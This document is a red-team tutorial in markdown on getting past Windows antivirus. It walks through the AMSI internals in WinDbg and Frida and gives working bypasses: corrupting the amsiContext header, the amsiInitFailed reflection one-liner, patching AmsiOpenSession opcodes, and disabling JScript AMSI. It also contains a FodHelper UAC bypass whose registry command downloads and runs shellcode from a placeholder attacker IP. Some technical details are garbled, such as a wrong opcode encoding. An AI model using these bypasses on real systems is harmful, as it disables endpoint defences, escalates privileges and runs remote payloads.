## Advanced Antivirus Evasion
Detection routines built into locally-installed antivirus clients have access to limited processing power, because users will hate/not tolerate scans that overly consume a local machine's resources. Most antivirus vendors use a cloud-based resources + artificial intelligence to detect malicious behavior. This is making our job as red team super super difficult.

Our pervious TTPs download and execute code directly in memory without giving some cheap antivirus a chance to scan it. Microsoft introduce Antimalware Scan Interface (AMSI) in Windows 10 to combat memory based script code execution. ASMI contains APIs that allow antivirus products to scan PowerShell commands and script based attacks when they are executed.

Let's learn Windows Defender implement ASMI. We will start with some baseline knowledge with assembly code and WinDebugger. sorry no note here,  you gotta google online. im allready master on low level language on Windebugger thing. And [WinDeb](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools) Debugger tool. Here I give you some free chicken..

Basic Debugger Commands

Set a breakpoint with bp followed by a memory address or the name of a function
```
0:010> bp kernel32!writefile
```

**g** command continue execution after setting a break point

**p** command execute a single assembly instruction

**r** review all register values

or review a single register
```
0:000> r rax
rax=0000000000000004
```

**u** command to unassemble a specific address location, for example unassemble the next 5 instructions after instruction pointer , **L5** meaning 5 more instructions
```
0:000> u rip L5
KERNELBASE!WriteFile+0xf:
00007fff`cff400bf 57 push rdi
00007fff`cff400c0 4883ec60 sub rsp,60h
00007fff`cff400c4 498bd9 mov rbx,r9
00007fff`cff400c7 4c8bda mov r11,rdx
00007fff`cff400ca 488bf9 mov rdi,rcx
```
**dd** **dc** **dq** commands are used to dump memory content format as 32 bit, 32 bit with ASCII, and 64 bit respectively.

**ed** followed by the memory address we wish to edit and the new value to edit the value
```
0:000> dd rsp L1
00000063`4c93e8c8 9a465c0e
0:000> ed rsp 0
0:000> dd rsp L1
00000063`4c93e8c8 0
```

## AMSI baseline knowledge
![image](https://user-images.githubusercontent.com/24555370/144544889-b12729b6-1dca-4c5b-940e-f5e2dd98e71b.png)

The unmanaged dynamic link library AMSI.DLL is loaded into every PowerShell. The dll forwarded relevant information to Window Deferder through Remote Procedure Call(RPC).After Windows Defender analyzes the data, the result is sent back to AMSI.DLL inside the PowerShell process.

When PowerShell launched, it loads AMSI.DLL and call AmsiInitialize API, AmsiInitialize takes place before we are able to invoke any PowerShell
commands, which means we cannot influence it in
```
HRESULT AmsiInitialize(
LPCWSTR appName, -> name of the application
HAMSICONTEXT *amsiContext -> a pointer to a context structure that is populated by the function
);
```
Once AmsiInitialize is complete and the context structure is created, AMSI can parse the issued
commands. When we execute a PowerShell command, the AmsiOpenSession API is called. It accepts the amsiContext context structure and creates a session structure to
be used in all calls within that session.
```
HRESULT AmsiOpenSession(
HAMSICONTEXT amsiContext,
HAMSISESSION *amsiSession
);
```

Next AmsiScanString and AmsiScanBuffer are used to capture the console input or script content either as a string or as a binary buffer respectively
```
HRESULT AmsiScanBuffer(
HAMSICONTEXT amsiContext, -> amsi context buffer
PVOID buffer, -> pointer to the buffer containing the content to be scanned
ULONG length, -> length of the buffer
LPCWSTR contentName, -> input identifier
HAMSISESSION amsiSession, -> session structure
AMSI_RESULT *result -> pointer to a storage buffer for the scan result, a enum type, value 32768 indicates persence of malware, 1 is clean scan
);
```
Once Scan is complete, AmsiCloseSession is called to close the AMSI scanning session.

## Hook your powershell with Frida
Frida is a opensource tool allow us to hook a process and watch Win32APi through a python backend and display the result(return values, input arguments) with JavaScript. If we want to learn more ASMI behavior, we have hook the powershell with Frida to observe the API calls.

#### Setting up Frida
- 1.install python
- 2.install pip with python3 [get-pip.py](/05FightAdvancedAntivirus/get-pip.py)
- 3.install Frida with pip install frida-tools
- 4.add Frida tools to your PATH environment, it should be something like  C:\Users\mst\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.9_qp0\LocalCache\local-packages\Python39\Scripts;

#### Montior process(powershell) with Frida
- 1.Start a 64 bit powershell process and get the process ID ```Get-Process -Name powershell```
- 2.Open command prompt, and run ```frida-trace -p powershellPID -x amsi.dll -i Amsi* ``` 
- 3.modify the defult javascript output format, so what can get input/output values. In our case, we want to know what is going on with AmsiScanBuffer located at **C:\Users\\mst\__handlers__\amsi.dll\AmsiScanBuffer.js** [AmsiScanBuffer.js](/05FightAdvancedAntivirus/AmsiScanBuffer.js)
- 4.Now you can interact with powershll process and watch the API calls.

## Bypass AMSI in Powershell
#### Destory amsiContext header
Now we got everything set up, we can test our ttps to bypass AMSI. recall AmsiInitialize API has a argument amsiContext, a pointer to a context structure. The context structure is used for rest of the APIs call in asmi.dll. We will use Frida to locate context structure address in memory and then use WinDbg to inspect its content. 
- 1.run fria-trace to examin pwoershell command input, after typing a test input in powershell you will find amsiContext address  in frida
```
 3087 ms  [*] AmsiScanBuffer()
 3087 ms  |- amsiContext: 0x1774c453c00
 3087 ms  |- buffer: { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
```
- 2.Attached powershell to WinDbg and dump memory at 0x1774c453c00, identify AMSI static string at first four bytes. Thayt is intersting.
```
0:017> dc 0x1774c453c00
00000177`4c453c00  49534d41 00000000 32330e00 00000177  AMSI......32w...
00000177`4c453c10  4c581650 00000177 000026e0 00000000  P.XLw....&......
```
- 3.Let's unassemble the AmsiOpenSession function from the AMSI module and maybe we can determine if the first four bytes are being referenced in any way
```
0:017> u amsi!AmsiOpenSession
amsi!AmsiOpenSession:
00007ffb`2aa33560 e9a3cb8f0b      jmp     00007ffb`36330108
00007ffb`2aa33565 4885c9          test    rcx,rcx
00007ffb`2aa33568 7442            je      amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)
00007ffb`2aa3356a 8139414d5349    cmp     dword ptr [rcx],49534D41h
00007ffb`2aa33570 753a            jne     amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)
00007ffb`2aa33572 4883790800      cmp     qword ptr [rcx+8],0
00007ffb`2aa33577 7433            je      amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)
00007ffb`2aa33579 4883791000      cmp     qword ptr [rcx+10h],0
```
hum, intersting, on line 4, you see the asembley code ```00007ffb`2aa3356a 8139414d5349    cmp     dword ptr [rcx],49534D41h``` a compare opcode is called, recall in x64 process, rcx is the first arugment of the function. The opcode is comparing the first function argument to a hex string 49534D41, which we know the ASCII repersentation of 49534D41h is AMSI. And the next instruction, ```jne     amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)``` redirect the program flow to **amsi!AmsiOpenSession+0x4c** if the argument is not equale to 49534D41h/AMSI.
- 4.We can dig a little deeper to see what is in memory address **amsi!AmsiOpenSession+0x4c** using u command to display the instructions at desired address
```
0:017> u amsi!AmsiOpenSession+0x4C L3
amsi!AmsiOpenSession+0x4c:
00007ffb`2aa335ac b857000780      mov     eax,80070057h
00007ffb`2aa335b1 c3              ret
00007ffb`2aa335b2 cc              int     3
```
Intersting at address amsi!AmsiOpenSession+0x4c(00007ffb`2aa335ac), the instuction move hex value 80070057h into eax, recall eax store function's return variable. And We can see the next instruction is ret, return. Recall  AmsiOpenSession has a return type [HRESULT](https://docs.microsoft.com/en-us/windows/win32/seccrypto/common-hresult-values), quick googling, we find out that 80070057h is E_INVALIDARG, meaning one or more arguments are not valid.

- 5.If we can modify the rcx, the first argument to anything but ASMI, we redirect the AmsiOpenSession API to return error, maybe we could bypass the ASMI scan? Let's give it a try.we’ll place a breakpoint on AmsiOpenSession and trigger it by entering a PowerShell command. Once the breakpoint has been triggered, we’ll use ed to modify the first
four bytes of the context structure, and let execution continue

```
0:017> bp amsi!AmsiOpenSession
0:017> g
Breakpoint 0 hit
*** WARNING: Unable to verify checksum for C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\7242d51cdca2ff9f6522a0c081fa3c4a\System.Management.Automation.ni.dll
amsi!AmsiOpenSession:
00007ffb`2aa33560 e9a3cb8f0b      jmp     00007ffb`36330108
0:009> dc rcx L1
00000177`4c453c00  49534d41                             AMSI
0:009> ed rcx 0
0:009> dc rcx L1
00000177`4c453c00  00000000                             ....
0:009> g
(868c.6d80): CLR exception - code e0434352 (first chance)
(868c.6d80): CLR exception - code e0434352 (first chance)
```
- 6.Let's run a malicious string in powershell, you will see on the left powershell process it print the malicious stirng with our bypass TTP. By corrupting the amsiContext header, we have effectively shut down AMSI without affecting PowerShell. We have effectively bypassed AMSI. Very nice.

![image](https://user-images.githubusercontent.com/24555370/144694463-24e66adb-4afc-4867-948d-094dd8f74e3f.png)

- 7.The method works, now we need to create a [BeatUpamsiContextHeader.ps1](/05FightAdvancedAntivirus/BeatUpHeader.ps1) to automate this process for us.. FYI the official name for this kind of attack is BeatUpamsiContextHeader powershell reflection ttps.

#### Attack AmsiInitialize fcuntion
Recall amsiContext? In the pervious TTPs, We destory the amsiContext header to bypass AMSI. This context structure is created by AmsiInitialize function.
We can manipulate a result variable set by AmsiInitialize, which also lead to AMSI bypass through amsiInitFailed field.
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
The amsiInitFailed field is verified by AmsiOpenSession in the same manner as the amsiContext header, which leads to an error. This AMSI bypass  still works even though it was discovered in 2016, but the substrings ‘AmsiUtils’ and ‘amsiInitFailed’ have since been flagged as malicious.
We could reuse the dynamic discovery of types and fields from our amsiContext AMSI bypass to evade the signatures and reuse this bypass.

**TODO.Create the bypass TTP script using dynamic discovery type.**

#### Attack AmsiOpenSession binary patching
We want to modify the assembly instructions themselve for this attack instead of the field data. We will target **AmsiOpenSession** funtion.

- First we need to understand the AmsiOpenSession assembly flow by dumping content of AmsiOpenSession

```
0:013> u amsi!AmsiOpenSession L1A
amsi!AmsiOpenSession:
00007ffa`4dbf3560 4885d2          test    rdx,rdx
00007ffa`4dbf3563 7447            je      amsi!AmsiOpenSession+0x4c (00007ffa`4dbf35ac)
00007ffa`4dbf3565 4885c9          test    rcx,rcx
00007ffa`4dbf3568 7442            je      amsi!AmsiOpenSession+0x4c (00007ffa`4dbf35ac)
00007ffa`4dbf356a 8139414d5349    cmp     dword ptr [rcx],49534D41h
00007ffa`4dbf3570 753a            jne     amsi!AmsiOpenSession+0x4c (00007ffa`4dbf35ac)
00007ffa`4dbf3572 4883790800      cmp     qword ptr [rcx+8],0
00007ffa`4dbf3577 7433            je      amsi!AmsiOpenSession+0x4c (00007ffa`4dbf35ac)
00007ffa`4dbf3579 4883791000      cmp     qword ptr [rcx+10h],0
00007ffa`4dbf357e 742c            je      amsi!AmsiOpenSession+0x4c (00007ffa`4dbf35ac)
00007ffa`4dbf3580 41b801000000    mov     r8d,1
00007ffa`4dbf3586 418bc0          mov     eax,r8d
00007ffa`4dbf3589 f00fc14118      lock xadd dword ptr [rcx+18h],eax
00007ffa`4dbf358e 4103c0          add     eax,r8d
00007ffa`4dbf3591 4898            cdqe
00007ffa`4dbf3593 488902          mov     qword ptr [rdx],rax
00007ffa`4dbf3596 7510            jne     amsi!AmsiOpenSession+0x48 (00007ffa`4dbf35a8)
00007ffa`4dbf3598 418bc0          mov     eax,r8d
00007ffa`4dbf359b f00fc14118      lock xadd dword ptr [rcx+18h],eax
00007ffa`4dbf35a0 4103c0          add     eax,r8d
00007ffa`4dbf35a3 4898            cdqe
00007ffa`4dbf35a5 488902          mov     qword ptr [rdx],rax
00007ffa`4dbf35a8 33c0            xor     eax,eax
00007ffa`4dbf35aa c3              ret
00007ffa`4dbf35ab cc              int     3
```
Pay attention to assembly line 1 and line 2. The conditional jump is controlled by the TEST instruction according to the argument and is
executed if the zero flag is equal to 1. We want to force the Zero flag by XOR two same register. In this case, we overwrite ```test    rdx,rdx``` to ```xor    rdx,rdx``` using this [assembler converter](https://defuse.ca/online-x86-assembler.htm#disassembly) we can get the hex instruction for  ```xor    rdx,rdx``` 0X4831C0.

- Second, We need to consider memory protection setting. Normally, code pages are set to PAGE_EXECUTE_READ, or 0x20, which means we can read and
execute this code, but not write to it. We can verify the in WinDg with ```!vport ```

```
0:013> !vprot 00007ffa4dbf3560
BaseAddress:       00007ffa4dbf3000
AllocationBase:    00007ffa4dbf0000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        0000000000009000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE

```
The protection type is ```PAGE_EXECUTE_READ```. We can't write to it.

- In[PatchingAsmiopenSessionppcodes.ps1](/05FightAdvancedAntivirus/PatchingAsmiopenSessionppcodes.ps1) We obatin a base address of AmsiOpenSession, change current memeory protection and overwrite it to xor rdx rdx, and change the memory protection back to 0x20.


reslove base address from dec to hex.
```
0:012> ? 0n140713022928224
Evaluate expression: 140713022928224 = 00007ffa`4dbf3560
0:012> u 00007ffa`4dbf3560
amsi!AmsiOpenSession:
00007ffa`4dbf3560 4885d2          test    rdx,rdx
```
## FodHelper UAC Bypass case Study,  Privilege Escalation attack

[Fodhelper.exe](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/) is a Win 10 application that manage optional features like region-specific keyboard settings. The application run as high integrity. It interacts with HKCU registry. This allow us ti create registry key and add DelegateExecute value. The below example, run.txt is staged shellcode.

```
PS C:\Users\mst> New-Item -Path HKCU:\Software\Classes\mssettings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://yourIP/run.txt') | IEX" -Force

PS C:\Users\mst> New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name DelegateExecute -PropertyType String -Force

PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe
```

## AMSI bypass witj JScript

We  create a Jscript test file with sleep enable.This allow us time to locate and attach the Wscript process before the script finish execution. 
```
WScript.Sleep(20000);
var WshShell = new ActiveXObject("WScript.Shell");
WshShell.Run("calc")
```
again we can use frida-trace to track the process flow, we notices that jscript call AmsiScanString and AmsiScanBuffer but not AmsiOpenSession
```
C:\Users\mst> frida-trace -p 708 -x amsi.dll -i Amsi*
Started tracing 9 functions. Press Ctrl+C to stop.
/* TID 0x144c */
12118 ms AmsiScanString()
12118 ms | [*] AmsiScanBuffer()
12118 ms | |- amsiContext: 0x28728e17c80
12118 ms | |- buffer: IHost.Sleep("20000");
IWshShell3.Run("calc");
12118 ms | |- length: 0x60
12118 ms | |- contentName 0x28728e35f08
12118 ms | |- amsiSession 0x0
12118 ms | |- result 0xf97dafdc00
12128 ms | [*] AmsiScanBuffer() Exit
12128 ms | |- Result value is: 1

```

Jscript tries to query the “AmsiEnable” registry key from the HKCU hive before initializing AMSI. If this key is set to “0”, AMSI is not
enabled for the Jscript process. This query is performed in **JAmsi::JAmsiIsEnabledByRegistry** function inside **Jscript.dll**, which
is only called when wscript.exe is started.

We can use win debug to set a break point on jscript!JAmsi::JAmsiIsEnabledByRegistry, and watch examine the memory address
```
0:000> bu jscript!JAmsi::JAmsiIsEnabledByRegistry
0:000> g

0:000> u rip L20
00007fff`a3a868f1 488d15e8cb0800 lea rdx,[jscript!`string' (00007fff`a3b134e0)]
00007fff`a3a868ff ff15f3a60800 call qword ptr [jscript!_imp_RegOpenKeyExW

00007fff`a3a86932 488d1587cb0800 lea rdx,[jscript!`string' (00007fff`a3b134c0)]
00007fff`a3a86939 ff15b1a60800 call qword ptr [jscript!_imp_RegQueryValueExW(00007fff`a3b10ff0)]
```

query the desire location
```
0:000> du 00007fff`a3b134e0
00007fff`a3b134e0 "SOFTWARE\Microsoft\Windows Scrip"
00007fff`a3b13520 "t\Settings"

0:000> du 7fff`a3b134c0
00007fff`a3b134c0 "AmsiEnable"
```

Putting everything togther, we can write [DisableAmsi.js](/05FightAdvancedAntivirus/DisableAmsi.js)  to set register key to 0. Or you can run this [all in on js dropper](/05FightAdvancedAntivirus/DisableAmsiReg.js) TODO, I need to complete this code, need to add full payload dropper. 

## Inject ASMI.DLL itslef? JScript bypass
The idea here is if we could prevent AMSI.DLL from loading or load our own version of it, we could force the AMSI implementation in wscript.exe to produce an error and abort.

- First, we need to use WinDebg to inspect AMSI.DLL loading process, instruct the debugger to catch the load of amsi DLL in WinDbg

```
0:000> sxe ld amsi
0:000> g
ModLoad: 00007fff`c6e20000 00007fff`c6e34000 C:\Windows\SYSTEM32\amsi.dll

0:000> lm m amsi
Browse full module list
start             end               module name
00007fff`c6e20000 00007fff`c6e34000 amsi (deferred)
```
- Second, backtrace to get list of called functions that led to current execution point, hint, DLL is typically loaded through the Win32 LoadLibraryor LoadLibraryEx APIs
```
0:000> k
# Child-SP           RetAddr           Call Site
08 00000085`733ed010 00007fff`cff40391 ntdll!LdrLoadDll+0xe4
09 00000085`733ed100 00007fff`a3a84ed8 KERNELBASE!LoadLibraryExW+0x161
0a 00000085`733ed170 00007fff`a3a84c6c jscript!COleScript::Initialize+0x2c
```
- Third, unassemble the function in the callstack to inspect the arguments supplied to LoadLibraryExW
```
0:000> u jscript!COleScript::Initialize LA
00007fff`a3a84ec5 41b800080000 mov r8d,800h
00007fff`a3a84ecb 488d0ddee40800 lea rcx,[jscript!`string' (00007fff`a3b133b0)]

0:000> du 7fff`a3b133b0
00007fff`a3b133b0 "amsi.dll"
```
Hint, R8 (the third argument) is set to 0x800->LOAD_LIBRARY_SEARCH_SYSTEM32, which forces the function to search c:\windows\system32 first. This pervent the dll hijicking attack, but i found this [intersting blog](https://www.tiraniddo.dev/2018/06/disabling-amsi-in-jscript-with-one.html) discussing a bypass method by renaming wscript.exe to amsi.dll and executing it. [overwrite.js](/05FightAdvancedAntivirus/overwrite.js )
